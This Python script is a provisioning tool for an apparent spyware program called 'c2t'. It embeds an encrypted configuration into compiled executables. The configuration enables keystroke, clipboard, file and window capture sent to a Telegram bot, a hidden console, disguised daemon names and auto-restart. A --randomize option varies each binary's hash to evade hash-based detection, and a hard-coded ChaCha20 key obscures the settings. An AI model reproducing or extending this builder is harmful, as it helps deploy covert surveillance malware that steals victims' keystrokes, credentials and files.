#!/usr/bin/env python3

# Copyright (C) 2026 roothunter
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

"""Provision c2t's reserved configuration region in an ELF, PE or Mach-O executable."""

from __future__ import annotations

import argparse
import binascii
import os
from pathlib import Path
import re
import secrets
import shutil
import struct
import sys
import tempfile


MAGIC = b"C2TCFG\x00\xa7\x31\xd5\x6c\x92\xe8\x4b\xf0\x1d"
VERSION = 2
HEADER_SIZE = 32
PAYLOAD_CAPACITY = 4096
REGION_SIZE = HEADER_SIZE + PAYLOAD_CAPACITY
SENSITIVE_KEYS = {"TELEGRAM_BOT_TOKEN", "TELEGRAM_CHAT_ID", "C2T_PROXY", "TELEGRAM_PROXY", "C2T_ALLOWED_MAC", "ALLOWED_MAC", "C2T_ALLOWED_IP", "ALLOWED_IP"}

EMBEDDED_KEY = bytes([
    0x8f, 0x1d, 0x4e, 0x93, 0x6a, 0x2b, 0x5c, 0x71,
    0x3e, 0x09, 0xba, 0xd4, 0x2f, 0x88, 0x19, 0xc3,
    0x77, 0x51, 0x9a, 0x42, 0xe6, 0x3d, 0x1b, 0x68,
    0x54, 0x0e, 0x82, 0xbf, 0x33, 0x7a, 0x9c, 0xd0
])


def rotl32(v: int, n: int) -> int:
    return ((v << n) & 0xFFFFFFFF) | (v >> (32 - n))


def chacha20_block(state: list[int]) -> list[int]:
    out = list(state)
    for _ in range(10):
        # Column round
        out[0] = (out[0] + out[4]) & 0xFFFFFFFF; out[12] = rotl32(out[12] ^ out[0], 16)
        out[8] = (out[8] + out[12]) & 0xFFFFFFFF; out[4] = rotl32(out[4] ^ out[8], 12)
        out[0] = (out[0] + out[4]) & 0xFFFFFFFF; out[12] = rotl32(out[12] ^ out[0], 8)
        out[8] = (out[8] + out[12]) & 0xFFFFFFFF; out[4] = rotl32(out[4] ^ out[8], 7)

        out[1] = (out[1] + out[5]) & 0xFFFFFFFF; out[13] = rotl32(out[13] ^ out[1], 16)
        out[9] = (out[9] + out[13]) & 0xFFFFFFFF; out[5] = rotl32(out[5] ^ out[9], 12)
        out[1] = (out[1] + out[5]) & 0xFFFFFFFF; out[13] = rotl32(out[13] ^ out[1], 8)
        out[9] = (out[9] + out[13]) & 0xFFFFFFFF; out[5] = rotl32(out[5] ^ out[9], 7)

        out[2] = (out[2] + out[6]) & 0xFFFFFFFF; out[14] = rotl32(out[14] ^ out[2], 16)
        out[10] = (out[10] + out[14]) & 0xFFFFFFFF; out[6] = rotl32(out[6] ^ out[10], 12)
        out[2] = (out[2] + out[6]) & 0xFFFFFFFF; out[14] = rotl32(out[14] ^ out[2], 8)
        out[10] = (out[10] + out[14]) & 0xFFFFFFFF; out[6] = rotl32(out[6] ^ out[10], 7)

        out[3] = (out[3] + out[7]) & 0xFFFFFFFF; out[15] = rotl32(out[15] ^ out[3], 16)
        out[11] = (out[11] + out[15]) & 0xFFFFFFFF; out[7] = rotl32(out[7] ^ out[11], 12)
        out[3] = (out[3] + out[7]) & 0xFFFFFFFF; out[15] = rotl32(out[15] ^ out[3], 8)
        out[11] = (out[11] + out[15]) & 0xFFFFFFFF; out[7] = rotl32(out[7] ^ out[11], 7)

        # Diagonal round
        out[0] = (out[0] + out[5]) & 0xFFFFFFFF; out[15] = rotl32(out[15] ^ out[0], 16)
        out[10] = (out[10] + out[15]) & 0xFFFFFFFF; out[5] = rotl32(out[5] ^ out[10], 12)
        out[0] = (out[0] + out[5]) & 0xFFFFFFFF; out[15] = rotl32(out[15] ^ out[0], 8)
        out[10] = (out[10] + out[15]) & 0xFFFFFFFF; out[5] = rotl32(out[5] ^ out[10], 7)

        out[1] = (out[1] + out[6]) & 0xFFFFFFFF; out[12] = rotl32(out[12] ^ out[1], 16)
        out[11] = (out[11] + out[12]) & 0xFFFFFFFF; out[6] = rotl32(out[6] ^ out[11], 12)
        out[1] = (out[1] + out[6]) & 0xFFFFFFFF; out[12] = rotl32(out[12] ^ out[1], 8)
        out[11] = (out[11] + out[12]) & 0xFFFFFFFF; out[6] = rotl32(out[6] ^ out[11], 7)

        out[2] = (out[2] + out[7]) & 0xFFFFFFFF; out[13] = rotl32(out[13] ^ out[2], 16)
        out[8] = (out[8] + out[13]) & 0xFFFFFFFF; out[7] = rotl32(out[7] ^ out[8], 12)
        out[2] = (out[2] + out[7]) & 0xFFFFFFFF; out[13] = rotl32(out[13] ^ out[2], 8)
        out[8] = (out[8] + out[13]) & 0xFFFFFFFF; out[7] = rotl32(out[7] ^ out[8], 7)

        out[3] = (out[3] + out[4]) & 0xFFFFFFFF; out[14] = rotl32(out[14] ^ out[3], 16)
        out[9] = (out[9] + out[14]) & 0xFFFFFFFF; out[4] = rotl32(out[4] ^ out[9], 12)
        out[3] = (out[3] + out[4]) & 0xFFFFFFFF; out[14] = rotl32(out[14] ^ out[3], 8)
        out[9] = (out[9] + out[14]) & 0xFFFFFFFF; out[4] = rotl32(out[4] ^ out[9], 7)

    return [(out[i] + state[i]) & 0xFFFFFFFF for i in range(16)]


def chacha20_crypt(key: bytes, nonce: bytes, counter: int, data: bytes) -> bytes:
    state = [
        0x61707865, 0x3330322D, 0x79622D32, 0x6B206574,
        *struct.unpack("<8I", key),
        counter,
        *struct.unpack("<3I", nonce),
    ]
    out = bytearray(len(data))
    offset = 0
    while offset < len(data):
        block = chacha20_block(state)
        keystream = struct.pack("<16I", *block)
        take = min(64, len(data) - offset)
        for i in range(take):
            out[offset + i] = data[offset + i] ^ keystream[i]
        state[12] = (state[12] + 1) & 0xFFFFFFFF
        offset += take
    return bytes(out)


ALLOWED_KEYS = {
    "C2T_VERBOSE",
    "C2T_LOG_FILE",
    "C2T_SAVE_STATE",
    "C2T_AUTO_RESTART",
    "C2T_HIDE_CONSOLE",
    "HIDE_CONSOLE",
    "TELEGRAM_ENABLED",
    "TELEGRAM_DEDUPLICATE",
    "TELEGRAM_SEND_FILES",
    "TELEGRAM_SEND_WINDOW_INFO",
    "TELEGRAM_SEND_LOGS",
    "TELEGRAM_SEND_KEYBOARD",
    "C2T_DISABLE_KEYBOARD",
    "DISABLE_KEYBOARD",
    "TELEGRAM_SEND_CLIPBOARD",
    "C2T_DISABLE_CLIPBOARD",
    "DISABLE_CLIPBOARD",
    "C2T_KEYBOARD_SHORTCUTS",
    "KEYBOARD_SHORTCUTS",
    "TELEGRAM_KEYBOARD_SHORTCUTS",
    "TELEGRAM_LOG_INTERVAL_SEC",
    "TELEGRAM_MAX_FILE_BYTES",
    "C2T_QUEUE_MAX_BYTES",
    "C2T_QUEUE_MAX_ITEMS",
    "C2T_DELIVERY_ATTEMPTS",
    "C2T_RETRY_DELAY_MS",
    "C2T_KEYBOARD_FLUSH_MS",
    "C2T_KEYBOARD_LAYOUT",
    "TELEGRAM_KEYBOARD_LAYOUT",
    "KEYBOARD_LAYOUT",
    "C2T_DAEMON_NAME",
    "C2T_SUPERVISOR_NAME",
    "C2T_NONCE",
    "C2T_BUILD_ID",
    "C2T_PROXY",
    "TELEGRAM_PROXY",
    "TELEGRAM_BOT_TOKEN",
    "TELEGRAM_CHAT_ID",
    "C2T_ALLOWED_MAC",
    "ALLOWED_MAC",
    "C2T_ALLOWED_IP",
    "ALLOWED_IP",
}
FLAG_KEYS = {
    "C2T_VERBOSE",
    "C2T_LOG_FILE",
    "C2T_SAVE_STATE",
    "C2T_AUTO_RESTART",
    "C2T_HIDE_CONSOLE",
    "HIDE_CONSOLE",
    "TELEGRAM_ENABLED",
    "TELEGRAM_DEDUPLICATE",
    "TELEGRAM_SEND_FILES",
    "TELEGRAM_SEND_WINDOW_INFO",
    "TELEGRAM_SEND_LOGS",
    "TELEGRAM_SEND_KEYBOARD",
    "C2T_DISABLE_KEYBOARD",
    "DISABLE_KEYBOARD",
    "TELEGRAM_SEND_CLIPBOARD",
    "C2T_DISABLE_CLIPBOARD",
    "DISABLE_CLIPBOARD",
    "C2T_KEYBOARD_SHORTCUTS",
    "KEYBOARD_SHORTCUTS",
    "TELEGRAM_KEYBOARD_SHORTCUTS",
}
STRING_KEYS = {
    "C2T_DAEMON_NAME",
    "C2T_SUPERVISOR_NAME",
    "C2T_KEYBOARD_LAYOUT",
    "TELEGRAM_KEYBOARD_LAYOUT",
    "KEYBOARD_LAYOUT",
    "C2T_NONCE",
    "C2T_BUILD_ID",
}
SIZE_KEYS = ALLOWED_KEYS - FLAG_KEYS - SENSITIVE_KEYS - STRING_KEYS


class ProvisionError(Exception):
    pass


def locate_region(binary: bytes) -> int:
    offsets: list[int] = []
    start = 0
    while True:
        offset = binary.find(MAGIC, start)
        if offset < 0:
            break
        offsets.append(offset)
        start = offset + 1
    if len(offsets) != 1:
        raise ProvisionError(
            f"expected exactly one c2t configuration region, found {len(offsets)}"
        )
    offset = offsets[0]
    if offset + REGION_SIZE > len(binary):
        raise ProvisionError("truncated c2t configuration region")
    version = struct.unpack_from("<I", binary, offset + 16)[0]
    if version not in (1, 2):
        raise ProvisionError(f"unsupported embedded configuration version {version}")
    return offset


def parse_config(stream) -> dict[str, str]:
    result: dict[str, str] = {}
    for line_number, raw_line in enumerate(stream, 1):
        line = raw_line.rstrip("\r\n")
        if not line or line.lstrip().startswith("#"):
            continue
        if line.startswith("export "):
            line = line[7:]
        if "=" not in line:
            raise ProvisionError(f"configuration line {line_number} has no '='")
        key, value = line.split("=", 1)
        if key not in ALLOWED_KEYS:
            raise ProvisionError(
                f"unknown configuration key {key!r} on line {line_number}"
            )
        if key in result:
            raise ProvisionError(f"duplicate configuration key {key!r}")
        if "\x00" in value:
            raise ProvisionError(f"NUL byte in value for {key}")
        if key in FLAG_KEYS and value not in {"0", "1"}:
            raise ProvisionError(f"{key} must be 0 or 1")
        if key in SIZE_KEYS and (not value.isascii() or not value.isdecimal() or int(value) == 0):
            raise ProvisionError(f"{key} must be a positive decimal integer")
        if key in STRING_KEYS and not re.match(r"^[a-zA-Z0-9_.-]{1,64}$", value):
            raise ProvisionError(f"{key} must be 1-64 alphanumeric characters (_.- allowed)")
        if key == "TELEGRAM_BOT_TOKEN" and len(value.encode("utf-8")) >= 512:
            raise ProvisionError("TELEGRAM_BOT_TOKEN is too long")
        if key == "TELEGRAM_CHAT_ID" and len(value.encode("utf-8")) >= 128:
            raise ProvisionError("TELEGRAM_CHAT_ID is too long")
        if (key == "C2T_PROXY" or key == "TELEGRAM_PROXY") and len(value.encode("utf-8")) >= 512:
            raise ProvisionError(f"{key} is too long")
        result[key] = value
    return result


def encode_payload(config: dict[str, str]) -> bytes:
    payload = "".join(f"{key}={config[key]}\n" for key in sorted(config)).encode("utf-8")
    if len(payload) > PAYLOAD_CAPACITY:
        raise ProvisionError(
            f"configuration needs {len(payload)} bytes; capacity is {PAYLOAD_CAPACITY}"
        )
    return payload


def decode_payload(binary: bytes, offset: int) -> dict[str, str]:
    version = struct.unpack_from("<I", binary, offset + 16)[0]
    length, expected_crc = struct.unpack_from("<II", binary, offset + 20)
    if length == 0:
        return {}
    if length > PAYLOAD_CAPACITY:
        raise ProvisionError("invalid embedded configuration length")
    raw_payload = binary[offset + HEADER_SIZE : offset + HEADER_SIZE + length]
    if binascii.crc32(raw_payload) != expected_crc:
        raise ProvisionError("embedded configuration checksum mismatch")
    if version == 2:
        if length < 12:
            raise ProvisionError("invalid encrypted embedded configuration payload")
        nonce = raw_payload[:12]
        ciphertext = raw_payload[12:]
        plaintext = chacha20_crypt(EMBEDDED_KEY, nonce, 0, ciphertext)
    elif version == 1:
        plaintext = raw_payload
    else:
        raise ProvisionError(f"unsupported embedded configuration version {version}")
    try:
        text = plaintext.decode("utf-8")
    except UnicodeDecodeError as error:
        raise ProvisionError("embedded configuration is not UTF-8") from error
    return parse_config(text.splitlines(keepends=True))


def patched_binary(binary: bytes, offset: int, payload: bytes) -> bytes:
    reject_signed_macho(binary)
    input_version = struct.unpack_from("<I", binary, offset + 16)[0]
    target_version = 1 if input_version == 1 else VERSION
    region = bytearray(REGION_SIZE)
    region[: len(MAGIC)] = MAGIC
    if payload:
        if target_version == 2:
            nonce = secrets.token_bytes(12)
            ciphertext = chacha20_crypt(EMBEDDED_KEY, nonce, 0, payload)
            final_payload = nonce + ciphertext
        else:
            final_payload = payload
    else:
        final_payload = b""
    struct.pack_into("<III", region, 16, target_version, len(final_payload), binascii.crc32(final_payload))
    region[HEADER_SIZE : HEADER_SIZE + len(final_payload)] = final_payload
    result = bytearray(binary[:offset] + region + binary[offset + REGION_SIZE :])
    checksum_offset = pe_checksum_offset(result)
    if checksum_offset is not None:
        struct.pack_into("<I", result, checksum_offset, pe_checksum(result, checksum_offset))
    return bytes(result)


def reject_signed_macho(binary: bytes | bytearray) -> None:
    if not binary.startswith(b"\xcf\xfa\xed\xfe"):
        return
    if len(binary) < 32:
        raise ProvisionError("truncated 64-bit Mach-O header")
    command_count, commands_size = struct.unpack_from("<II", binary, 16)
    command_offset = 32
    command_end = command_offset + commands_size
    if command_end > len(binary):
        raise ProvisionError("truncated Mach-O load commands")
    for _ in range(command_count):
        if command_offset + 8 > command_end:
            raise ProvisionError("truncated Mach-O load command")
        command, command_size = struct.unpack_from("<II", binary, command_offset)
        if command_size < 8 or command_offset + command_size > command_end:
            raise ProvisionError("invalid Mach-O load command size")
        if command == 0x1D:
            raise ProvisionError(
                "the Mach-O file is code signed; use the macOS sidecar or remove "
                "the signature, provision, and sign it again"
            )
        command_offset += command_size


def pe_checksum_offset(binary: bytes | bytearray) -> int | None:
    if not binary.startswith(b"MZ"):
        return None
    if len(binary) < 0x40:
        raise ProvisionError("truncated PE DOS header")
    pe_offset = struct.unpack_from("<I", binary, 0x3C)[0]
    optional_offset = pe_offset + 24
    if optional_offset + 2 > len(binary) or binary[pe_offset : pe_offset + 4] != b"PE\0\0":
        raise ProvisionError("invalid PE header")
    optional_magic = struct.unpack_from("<H", binary, optional_offset)[0]
    if optional_magic == 0x10B:
        directory_count_offset = optional_offset + 92
        directories_offset = optional_offset + 96
    elif optional_magic == 0x20B:
        directory_count_offset = optional_offset + 108
        directories_offset = optional_offset + 112
    else:
        raise ProvisionError("unsupported PE optional header")
    if directory_count_offset + 4 > len(binary):
        raise ProvisionError("truncated PE optional header")
    directory_count = struct.unpack_from("<I", binary, directory_count_offset)[0]
    if directory_count > 4:
        certificate_offset = directories_offset + 4 * 8
        if certificate_offset + 8 > len(binary):
            raise ProvisionError("truncated PE data directories")
        certificate_address, certificate_size = struct.unpack_from(
            "<II", binary, certificate_offset
        )
        if certificate_address or certificate_size:
            raise ProvisionError(
                "the PE file has an Authenticode certificate; provision the unsigned "
                "executable and sign it afterwards"
            )
    checksum_offset = optional_offset + 64
    if checksum_offset + 4 > len(binary):
        raise ProvisionError("truncated PE checksum field")
    return checksum_offset


def pe_checksum(binary: bytes | bytearray, checksum_offset: int) -> int:
    checksum = 0
    for offset in range(0, len(binary), 2):
        if checksum_offset <= offset < checksum_offset + 4:
            word = 0
        elif offset + 1 < len(binary):
            word = binary[offset] | (binary[offset + 1] << 8)
        else:
            word = binary[offset]
        checksum = (checksum & 0xFFFF) + word + (checksum >> 16)
    checksum = (checksum & 0xFFFF) + (checksum >> 16)
    checksum = (checksum & 0xFFFF) + (checksum >> 16)
    return (checksum & 0xFFFF) + len(binary)


def write_atomic(output: Path, contents: bytes, source_mode: int) -> None:
    output.parent.mkdir(parents=True, exist_ok=True)
    descriptor, temporary_name = tempfile.mkstemp(
        prefix=f".{output.name}.", dir=output.parent
    )
    temporary = Path(temporary_name)
    try:
        with os.fdopen(descriptor, "wb") as stream:
            stream.write(contents)
            stream.flush()
            os.fsync(stream.fileno())
        os.chmod(temporary, source_mode)
        os.replace(temporary, output)
    finally:
        if temporary.exists():
            temporary.unlink()


def argument_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Embed c2t secrets/configuration after compilation"
    )
    parser.add_argument("executable", type=Path, help="unprovisioned c2t executable")
    parser.add_argument("--config", metavar="FILE", help="KEY=VALUE file, or - for stdin")
    parser.add_argument(
        "--from-env",
        action="append",
        default=[],
        choices=sorted(ALLOWED_KEYS),
        metavar="KEY",
        help="read KEY directly from this process environment; repeatable",
    )
    parser.add_argument(
        "--randomize",
        action="store_true",
        help="inject a unique random cryptographic nonce (C2T_NONCE) for polymorphic binary hash",
    )
    parser.add_argument("--output", type=Path, help="write a provisioned copy here")
    parser.add_argument("--in-place", action="store_true", help="replace the input executable")
    parser.add_argument("--force", action="store_true", help="allow replacing an existing output")
    parser.add_argument("--clear", action="store_true", help="remove embedded configuration")
    parser.add_argument("--inspect", action="store_true", help="list embedded keys; secrets are redacted")
    return parser


def main() -> int:
    parser = argument_parser()
    arguments = parser.parse_args()
    has_configuration = (
        arguments.config is not None
        or bool(arguments.from_env)
        or arguments.randomize
    )
    actions = sum((arguments.clear, arguments.inspect, has_configuration))
    if actions != 1:
        parser.error("choose exactly one of --config, --clear, --inspect, or --randomize")
    if arguments.in_place and arguments.output:
        parser.error("--in-place and --output are mutually exclusive")
    if arguments.in_place and arguments.force:
        parser.error("--force is only used with --output")
    if arguments.inspect and (arguments.in_place or arguments.output or arguments.force):
        parser.error("--inspect does not accept output options")
    if not arguments.executable.is_file():
        raise ProvisionError(f"executable not found: {arguments.executable}")

    binary = arguments.executable.read_bytes()
    offset = locate_region(binary)
    if arguments.inspect:
        config = decode_payload(binary, offset)
        if not config:
            print("Embedded configuration: empty")
        else:
            print("Embedded configuration:")
            for key in sorted(config):
                value = "<redacted>" if key in SENSITIVE_KEYS else config[key]
                print(f"  {key}={value}")
        return 0

    if not arguments.in_place and not arguments.output:
        parser.error("provisioning requires --output or --in-place")
    if arguments.clear:
        config: dict[str, str] = {}
    elif arguments.config == "-":
        config = parse_config(sys.stdin)
    elif arguments.config:
        with open(arguments.config, encoding="utf-8", newline="") as stream:
            config = parse_config(stream)
    else:
        config = {}

    seen_environment_keys: set[str] = set()
    for key in arguments.from_env:
        if key in seen_environment_keys:
            raise ProvisionError(f"duplicate --from-env key {key!r}")
        seen_environment_keys.add(key)
        if key not in os.environ:
            raise ProvisionError(f"environment variable {key} is not set")
        value = os.environ[key]
        if "\n" in value or "\r" in value:
            raise ProvisionError(f"newline in environment value for {key}")
        config.update(parse_config([f"{key}={value}\n"]))

    if arguments.randomize and "C2T_NONCE" not in config and "C2T_BUILD_ID" not in config:
        config["C2T_NONCE"] = secrets.token_hex(16)

    payload = encode_payload(config)
    output = arguments.executable if arguments.in_place else arguments.output
    assert output is not None
    if not arguments.in_place:
        if output.resolve() == arguments.executable.resolve():
            parser.error("use --in-place to replace the input executable")
        if output.exists() and not arguments.force:
            parser.error("output already exists; use --force to replace it")
    result = patched_binary(binary, offset, payload)
    write_atomic(output, result, arguments.executable.stat().st_mode)
    shutil.copystat(arguments.executable, output, follow_symlinks=True)
    print(f"Embedded {len(config)} configuration value(s) in {output}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, UnicodeError, ProvisionError) as error:
        print(f"error: {error}", file=sys.stderr)
        raise SystemExit(1)
